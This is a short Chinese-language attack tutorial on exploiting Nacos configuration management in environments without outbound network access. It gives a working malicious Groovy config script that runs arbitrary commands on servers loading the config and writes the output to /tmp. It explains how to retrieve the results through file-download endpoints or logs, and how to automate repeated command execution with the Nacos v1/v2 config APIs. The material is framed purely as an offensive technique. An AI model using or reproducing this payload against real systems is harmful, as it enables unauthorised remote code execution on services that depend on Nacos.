### Nacos 不出网利用方式

**1. 构造恶意 Groovy 配置文件**

与之前的方法类似，我们需要构造一个恶意 Groovy 脚本。这次，我们的目标是让命令执行的结果能够被我们看到

- **Data ID**：任意命名，例如 `internal-shell.groovy`
- **配置格式**：`Groovy`
- **配置内容**：

我们可以将命令执行的结果写入到一个可写的文件中。以下是一个示例，它会执行 `ifconfig` 命令，并将结果写入到 `/tmp/nacos-result.txt` 文件中

```groovy
def process = "ifconfig".execute()
def output = new StringBuilder()
process.consumeProcessOutput(output, output)

def file = new File("/tmp/nacos-result.txt")
file.withWriter('UTF-8') { writer ->
    writer.write(output.toString())
}
```

请将 `ifconfig` 替换为你想要执行的命令，并将 `/tmp/nacos-result.txt` 替换为一个你确定有写入权限的路径

**2. 发布配置并触发**

在 Nacos 控制台中发布这个恶意配置，等待目标应用加载配置并执行。一旦应用加载了该配置，Groovy 脚本就会在服务器上执行，并将命令执行结果写入指定的文件中

**3. 获取命令执行结果**

现在，最关键的问题是如何获取到写入文件的结果。这通常需要依赖于以下两种情况：

- **有文件下载或读取接口**：如果目标服务器的应用存在文件下载功能，并且我们可以控制下载路径，那么我们可以通过这个功能来下载 `/tmp/nacos-result.txt` 文件，从而获取命令执行的结果。
- **通过 Nacos 控制台回显**：在某些情况下，Nacos 的配置加载可能会在应用的日志中打印出结果。如果我们可以访问到应用的日志，那么也可以从中获取信息。但这种方式不够稳定和通用

**4. 自动化命令执行（进阶）**

如果需要进行多次命令执行，每次都修改配置并发布会非常麻烦。我们可以利用 Nacos 的 API 来实现自动化

- **1.0 版本的 API**：
  - **获取配置内容**：`GET /nacos/v1/cs/configs?dataId=<dataId>&group=<group>`
  - **修改配置内容**：`POST /nacos/v1/cs/configs`
- **2.0 版本的 API**：
  - **获取配置内容**：`POST /nacos/v2/cs/configs`
  - **修改配置内容**：`POST /nacos/v2/cs/configs`

我们可以编写一个脚本，循环执行以下操作：

1. **构造 Groovy 脚本**，将要执行的命令写入其中
2. **通过 API 更新配置**
3. **通过 API 获取配置**，并尝试从中提取命令执行结果（如果结果被写入配置中）
4. **通过文件下载接口**或其他方式获取结果